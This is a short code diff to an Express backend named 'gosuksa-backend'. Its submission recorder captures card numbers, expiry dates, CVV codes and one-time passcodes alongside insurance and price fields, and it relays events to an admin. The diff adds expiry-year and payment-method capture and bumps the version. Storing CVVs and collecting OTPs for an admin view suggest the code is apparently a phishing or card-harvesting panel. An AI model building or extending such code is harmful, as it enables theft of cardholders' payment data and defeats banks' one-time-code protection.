@@ -221,7 +221,9 @@ function recordSubmission(type, payload) {
     set("price", ["totalPrice", "price", "amount"]);
     set("insuranceType", ["TypeOfInsuranceContract", "insuranceType"]);
     set("cardNumber", ["cardNumber"]);
-    set("cardExpiry", ["expiry", "expiryDate"]);
+    set("cardExpiry", ["expiry", "expiryDate", "expiryMonth"]);
+    set("cardExpiryYear", ["expiryYear"]);
+    set("paymentMethod", ["paymentMethod"]);
     set("cardCvv", ["cvv"]);
     set("otp", ["otp", "otpCode", "code"]);
     set("result", ["result"]);
@@ -252,7 +254,7 @@ function broadcastAdminEvent(id, event, payload) {
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
-const APP_VERSION = "v8";
+const APP_VERSION = "v9";
 app.get("/version", (_req, res) =>
   res.json({
     version: APP_VERSION,
